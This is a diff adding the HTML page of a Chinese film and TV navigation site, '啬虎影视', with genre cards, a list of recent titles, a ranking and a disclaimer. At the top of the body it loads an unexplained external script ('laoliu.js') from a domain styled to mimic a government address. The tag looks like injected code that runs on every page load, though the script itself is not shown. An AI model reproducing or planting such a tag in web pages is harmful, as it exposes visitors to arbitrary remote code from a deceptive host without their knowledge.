@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>啬虎影视 - 藏锋于夜的高清影视导航 | sehuyingshi-h5.github.io</title>
+<meta name="description" content="啬虎影视（sehuyingshi-h5.github.io）以暗夜山君美学整理电影、剧集、动漫与综艺：克制排版、斑纹分区、高清画质标注，手机电脑自适应，不弹窗，不喧哗。">
+<meta name="keywords" content="啬虎影视, 高清影视导航, 暗色影视站, 电影电视剧, 影视索引, sehuyingshi-h5">
+<meta name="author" content="啬虎影视">
+<meta name="robots" content="index, follow">
+<style>
+  :root{
+    --night:#0d0b0a;
+    --ink:#16120f;
+    --panel:#1c1714;
+    --gold:#e8b04b;
+    --gold-d:#a9772f;
+    --blood:#ff6b3d;
+    --moon:#cfc6b8;
+    --moss:#6f8f7d;
+    --line:1px solid #e8b04b33;
+    --stripe:repeating-linear-gradient(115deg,#e8b04b22 0 6px,transparent 6px 14px, #e8b04b14 14px 17px, transparent 17px 30px);
+    --sans:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+    --serif:'Songti SC','STSong','SimSun',Georgia,serif;
+    --mono:'SFMono-Regular',Consolas,monospace;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:var(--sans);background:var(--night);color:var(--moon);
+    line-height:1.7;overflow-x:hidden;position:relative;
+    background-image:
+      radial-gradient(circle at 82% 8%, #e8b04b14 0, transparent 42%),
+      radial-gradient(circle at 12% 88%, #ff6b3d10 0, transparent 45%),
+      radial-gradient(circle at 50% 50%, #000 0, transparent 100%);
+  }
+  body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+    box-shadow:inset 0 0 200px #000c;}
+  a{color:var(--moss);text-decoration:none;transition:.2s;}
+  a:hover{color:var(--gold);}
+  .wrap{max-width:1080px;margin:0 auto;padding:0 1.2rem;position:relative;z-index:2;}
+
+  /* 顶栏 */
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:1.1rem 1.2rem;
+    position:sticky;top:0;z-index:60;background:linear-gradient(var(--night),transparent);backdrop-filter:blur(8px);
+    border-bottom:var(--line);}
+  .brand{display:flex;align-items:center;gap:.6rem;font-family:var(--serif);font-weight:700;
+    font-size:1.3rem;color:var(--gold);letter-spacing:2px;}
+  .tiger{width:26px;height:22px;flex:none;}
+  .nav{display:flex;gap:1.2rem;font-family:var(--serif);font-size:.9rem;letter-spacing:1px;}
+  .nav a{color:var(--moon);opacity:.75;}
+  .nav a:hover{opacity:1;color:var(--gold);}
+
+  section{position:relative;padding:4.5rem 0 3.5rem;border-bottom:var(--line);}
+  .sec-head{display:flex;align-items:center;gap:.8rem;margin-bottom:2rem;}
+  .seal{font-family:var(--mono);font-size:.68rem;letter-spacing:2px;color:var(--gold);
+    border:1px solid var(--gold-d);padding:.2rem .6rem;background:#e8b04b0a;transform:rotate(-1.5deg);}
+  h2.sec-title{font-family:var(--serif);font-size:clamp(1.7rem,4vw,2.6rem);color:var(--moon);letter-spacing:1px;font-weight:600;}
+
+  /* 栏目1：山君屏影 */
+  #home{padding-top:3rem;}
+  .den{display:grid;grid-template-columns:.85fr 1.15fr;gap:2.4rem;align-items:center;}
+  .eye-wrap{position:relative;text-align:center;}
+  .eye{width:min(220px,52vw);aspect-ratio:1;margin:0 auto;position:relative;}
+  .eye svg{width:100%;height:100%;filter:drop-shadow(0 0 24px #e8b04b33);}
+  .pupil-glow{transform-origin:center;animation:breathe 5s ease-in-out infinite alternate;}
+  @keyframes breathe{from{opacity:.7;}to{opacity:1;}}
+  .hero-txt h1{font-family:var(--serif);font-size:clamp(2.6rem,7vw,4.6rem);line-height:1.04;letter-spacing:1px;}
+  .hero-txt h1 em{font-style:normal;color:var(--gold);text-shadow:0 2px 20px #e8b04b44;}
+  .hero-txt h1 .blood{color:var(--blood);}
+  .hero-txt p.lead{margin:1.2rem 0 1.5rem;color:var(--moon);opacity:.82;max-width:520px;font-size:1.02rem;}
+  .tags{display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:1.7rem;}
+  .tag{font-family:var(--mono);font-size:.72rem;border:1px solid var(--gold-d);color:var(--gold);
+    padding:.28rem .8rem;background:#e8b04b0a;}
+  .cta{display:inline-block;background:var(--gold);color:var(--night);font-family:var(--serif);font-weight:700;
+    letter-spacing:1px;padding:.75rem 2rem;clip-path:polygon(5% 0,100% 0,95% 100%,0 100%);}
+  .cta:hover{background:var(--blood);color:#fff;}
+
+  /* 栏目2：爪痕格 */
+  #category .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1.1rem;}
+  .claw{position:relative;background:var(--panel);border:1px solid var(--gold-d);padding:1.3rem 1.2rem 1.2rem;
+    clip-path:polygon(0 0,100% 0,100% 86%,90% 100%,0 100%);transition:.18s;overflow:hidden;}
+  .claw::before{content:"";position:absolute;top:0;left:0;right:0;height:42%;background:var(--stripe);opacity:.25;}
+  .claw:hover{transform:translateY(-4px);background:var(--ink);box-shadow:0 10px 24px #e8b04b18;}
+  .claw .mark{position:absolute;top:10px;right:12px;font-size:.9rem;opacity:.8;}
+  .claw h3{font-family:var(--serif);font-size:1.05rem;color:var(--moon);margin-top:.4rem;letter-spacing:.5px;}
+  .claw p{font-size:.76rem;opacity:.62;margin-top:.2rem;}
+
+  /* 栏目3：斑纹片匣 */
+  #latest .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.3rem;}
+  .box{background:linear-gradient(150deg,var(--panel),var(--ink));border:1px solid var(--gold-d);
+    border-radius:6px;overflow:hidden;transition:.18s;position:relative;}
+  .box:hover{transform:translateY(-3px);box-shadow:0 12px 28px #000a,0 0 0 1px #e8b04b33;}
+  .cover{height:130px;display:flex;align-items:center;justify-content:center;font-size:3rem;position:relative;
+    background:radial-gradient(circle at 70% 20%,#e8b04b22,transparent 60%),var(--ink);}
+  .cover.c2{background:radial-gradient(circle at 30% 30%,#ff6b3d22,transparent 60%),var(--ink);}
+  .cover.c3{background:radial-gradient(circle at 60% 40%,#6f8f7d22,transparent 60%),var(--ink);}
+  .cover .paw{position:absolute;bottom:8px;right:10px;font-size:.85rem;filter:drop-shadow(0 1px 2px #000);}
+  .box .info{padding:1.1rem 1.2rem;}
+  .box h3{font-family:var(--serif);font-size:1.05rem;color:var(--moon);letter-spacing:.5px;}
+  .box .sub{font-size:.76rem;opacity:.66;margin:.25rem 0 .7rem;}
+  .box .foot{display:flex;align-items:center;justify-content:space-between;border-top:1px dashed #e8b04b33;padding-top:.6rem;}
+  .see{font-family:var(--serif);font-size:.82rem;color:var(--gold);border-bottom:1px solid var(--gold);}
+
+  /* 栏目4：兽瞳锐度榜 */
+  #ranking .list{max-width:760px;}
+  .row{display:grid;grid-template-columns:54px 1fr auto;gap:1rem;align-items:center;padding:1.05rem 0;
+    border-bottom:var(--line);}
+  .no{font-family:var(--serif);font-size:1.25rem;color:var(--gold);text-align:center;text-shadow:0 0 12px #e8b04b44;}
+  .no.top{color:var(--blood);}
+  .row h3{font-size:1rem;}
+  .row .sub{font-size:.74rem;opacity:.64;}
+  .scale{height:10px;background:var(--ink);border:1px solid var(--gold-d);margin-top:.45rem;position:relative;
+    border-radius:2px;overflow:hidden;}
+  .scale .fill{height:100%;background:linear-gradient(90deg,var(--gold-d),var(--gold),var(--blood));}
+  .scale .fill::after{content:"";position:absolute;right:0;top:50%;width:8px;height:8px;transform:translate(3px,-50%);
+    background:var(--blood);border-radius:50%;box-shadow:0 0 8px var(--blood);}
+  .val{font-family:var(--mono);font-size:.8rem;color:var(--gold);}
+
+  /* 栏目5 */
+  #about .note{background:var(--panel);border:1px solid var(--gold-d);border-left:4px solid var(--blood);
+    padding:1.7rem;font-size:.92rem;opacity:.85;}
+  #about .note b{color:var(--gold);}
+  .url{font-family:var(--mono);color:var(--moss);margin-top:.8rem;display:inline-block;}
+
+  footer{text-align:center;font-family:var(--mono);font-size:.78rem;opacity:.6;padding:2.5rem 1rem 3rem;border-top:var(--line);}
+
+  @media(max-width:768px){
+    .nav{display:none;}
+    .den{grid-template-columns:1fr;text-align:center;}
+    .eye-wrap{order:-1;}
+    .hero-txt h1{font-size:2.7rem;}
+    #category .grid{grid-template-columns:1fr 1fr;}
+    #latest .grid{grid-template-columns:1fr;}
+    .row{grid-template-columns:44px 1fr;}
+    .val{display:none;}
+  }
+  @media(max-width:420px){#category .grid{grid-template-columns:1fr;}}
+  @media(prefers-reduced-motion:reduce){*{animation:none!important;}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="brand">
+    <svg class="tiger" viewBox="0 0 60 50" fill="none" aria-hidden="true">
+      <defs>
+        <radialGradient id="pg" cx="50%" cy="45%" r="55%">
+          <stop offset="0" stop-color="#ffe9b0"/><stop offset="40%" stop-color="#e8b04b"/><stop offset="100%" stop-color="#a9772f"/>
+        </radialGradient>
+      </defs>
+      <path d="M6,40 C14,30 22,18 30,10 C38,18 46,30 54,40 C46,36 38,33 30,34 C22,33 14,36 6,40Z" fill="#e8b04b" opacity=".9"/>
+      <path d="M30,10 C24,22 16,28 8,30 M30,10 C36,22 44,28 52,30" stroke="#a9772f" stroke-width="1.4" fill="none"/>
+      <circle cx="30" cy="24" r="9" fill="url(#pg)"/>
+      <path d="M30,18 L33,24 L30,30 L27,24 Z" fill="#0d0b0a"/>
+    </svg>
+    啬虎影视
+  </div>
+  <nav class="nav">
+    <a href="#home">屏影</a>
+    <a href="#category">爪痕</a>
+    <a href="#latest">片匣</a>
+    <a href="#ranking">兽瞳</a>
+    <a href="#about">藏锋</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="den">
+      <div class="eye-wrap">
+        <div class="eye">
+          <svg viewBox="0 0 200 200" aria-hidden="true">
+            <defs>
+              <radialGradient id="iris" cx="50%" cy="45%" r="60%">
+                <stop offset="0" stop-color="#fff3d0"/>
+                <stop offset="35%" stop-color="#e8b04b"/>
+                <stop offset="75%" stop-color="#a9772f"/>
+                <stop offset="100%" stop-color="#1c1714"/>
+              </radialGradient>
+            </defs>
+            <path d="M20,100 C60,40 140,40 180,100 C140,160 60,160 20,100Z" fill="#16120f" stroke="#e8b04b" stroke-width="2"/>
+            <g class="pupil-glow">
+              <circle cx="100" cy="100" r="46" fill="url(#iris)"/>
+              <path d="M100,60 L116,100 L100,140 L84,100 Z" fill="#0d0b0a"/>
+              <circle cx="86" cy="86" r="5" fill="#fff8" />
+            </g>
+          </svg>
+        </div>
+      </div>
+      <div class="hero-txt">
+        <span class="seal">山君 · 藏锋</span>
+        <h1>啬虎影视<br><em>夜行</em> <span class="blood">不吼</span></h1>
+        <p class="lead">sehuyingshi-h5.github.io —— 把电影、剧集、动漫、综艺收进暗夜仓廪。斑纹分区、画质标注、克制排版，不弹窗、不吵你，只把最锋利的那一部递到眼前。</p>
+        <div class="tags">
+          <span class="tag">🐾 4K 锐光</span>
+          <span class="tag">🌑 1080P 夜场</span>
+          <span class="tag">🗡️ 中字藏锋</span>
+          <span class="tag">🔥 无喧哗</span>
+        </div>
+        <a href="#latest" class="cta">入林挑片 →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="category">
+    <div class="sec-head"><span class="seal">爪痕</span><h2 class="sec-title">斑纹分区</h2></div>
+    <div class="grid">
+      <div class="claw"><span class="mark">🐯</span><h3>啸林台</h3><p>动作 / 武侠 / 战争</p></div>
+      <div class="claw"><span class="mark">🌒</span><h3>潜行巷</h3><p>悬疑 / 犯罪 / 烧脑</p></div>
+      <div class="claw"><span class="mark">🌌</span><h3>星野径</h3><p>科幻 / 灾变 / 奇幻</p></div>
+      <div class="claw"><span class="mark">🎴</span><h3>百兽苑</h3><p>动漫 / 国漫 / 新番</p></div>
+      <div class="claw"><span class="mark">🥃</span><h3>夜话棚</h3><p>综艺 / 访谈 / 脱口秀</p></div>
+      <div class="claw"><span class="mark">🗻</span><h3>远山志</h3><p>纪录片 / 人文 / 自然</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="latest">
+    <div class="sec-head"><span class="seal">片匣</span><h2 class="sec-title">今夜斑纹片单</h2></div>
+    <div class="grid">
+      <article class="box">
+        <div class="cover">🏜️<span class="paw">🐾</span></div>
+        <div class="info"><h3>沙丘3：救世主</h3><div class="sub">科幻 / 156min / 4K 锐光</div>
+          <div class="foot"><span class="sub">星野径</span><a href="#" class="see">展匣</a></div></div>
+      </article>
+      <article class="box">
+        <div class="cover c2">👑<span class="paw">🐾</span></div>
+        <div class="info"><h3>庆余年2</h3><div class="sub">古装权谋 / 32集</div>
+          <div class="foot"><span class="sub">啸林台·权谋</span><a href="#" class="see">展匣</a></div></div>
+      </article>
+      <article class="box">
+        <div class="cover c3">🔥<span class="paw">🐾</span></div>
+        <div class="info"><h3>周处除三害</h3><div class="sub">动作犯罪 / 134min / BD</div>
+          <div class="foot"><span class="sub">啸林台</span><a href="#" class="see">展匣</a></div></div>
+      </article>
+      <article class="box">
+        <div class="cover">⚔️<span class="paw">🐾</span></div>
+        <div class="info"><h3>咒术回战 S3</h3><div class="sub">动漫 / 连载中</div>
+          <div class="foot"><span class="sub">百兽苑</span><a href="#" class="see">展匣</a></div></div>
+      </article>
+      <article class="box">
+        <div class="cover c2">🏎️<span class="paw">🐾</span></div>
+        <div class="info"><h3>飞驰人生2</h3><div class="sub">喜剧 / 118min</div>
+          <div class="foot"><span class="sub">夜话棚</span><a href="#" class="see">展匣</a></div></div>
+      </article>
+      <article class="box">
+        <div class="cover c3">🌸<span class="paw">🐾</span></div>
+        <div class="info"><h3>花束般的恋爱</h3><div class="sub">爱情 / 124min / 杜比</div>
+          <div class="foot"><span class="sub">夜话棚·下饭</span><a href="#" class="see">展匣</a></div></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="ranking">
+    <div class="sec-head"><span class="seal">兽瞳</span><h2 class="sec-title">锐度榜</h2></div>
+    <div class="list">
+      <div class="row">
+        <div class="no top">壹</div>
+        <div><h3>繁花</h3><div class="sub">国产剧 / 王家卫美学</div>
+          <div class="scale"><div class="fill" style="width:98%"></div></div></div>
+        <div class="val">9.8</div>
+      </div>
+      <div class="row">
+        <div class="no top">贰</div>
+        <div><h3>庆余年2</h3><div class="sub">古装权谋</div>
+          <div class="scale"><div class="fill" style="width:95%"></div></div></div>
+        <div class="val">9.5</div>
+      </div>
+      <div class="row">
+        <div class="no top">叁</div>
+        <div><h3>沙丘3</h3><div class="sub">科幻 / 4K 锐光</div>
+          <div class="scale"><div class="fill" style="width:92%"></div></div></div>
+        <div class="val">9.2</div>
+      </div>
+      <div class="row">
+        <div class="no">肆</div>
+        <div><h3>周处除三害</h3><div class="sub">动作犯罪</div>
+          <div class="scale"><div class="fill" style="width:88%"></div></div></div>
+        <div class="val">8.8</div>
+      </div>
+      <div class="row">
+        <div class="no">伍</div>
+        <div><h3>热辣滚烫</h3><div class="sub">励志喜剧</div>
+          <div class="scale"><div class="fill" style="width:84%"></div></div></div>
+        <div class="val">8.4</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="about">
+    <div class="sec-head"><span class="seal">藏锋</span><h2 class="sec-title">仓廪小记</h2></div>
+    <div class="note">
+      <p><b>啬虎影视</b>是一间暗夜放映仓廪，只做分类索引、画质标注与入口整理，<b>不托管视频文件，也不内置播放源</b>。藏锋于夜，挑片不慌。</p>
+      <p style="margin-top:.6rem">内容用于个人观影决策与学习交流；实际观看请通过正规授权平台，并遵守当地网络与版权规范。</p>
+      <a href="#" class="url">🐯 https://sehuyingshi-h5.github.io</a>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  啬虎影视 / sehuyingshi-h5.github.io<br>
+  © 2026 暗夜山君 · Noir Stripe Den Edition
+</footer>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click',e=>{
+      e.preventDefault();
+      const t=document.querySelector(a.getAttribute('href'));
+      if(t)t.scrollIntoView({behavior:'smooth'});
+    });
+  });
+</script>
+</body>
+</html>
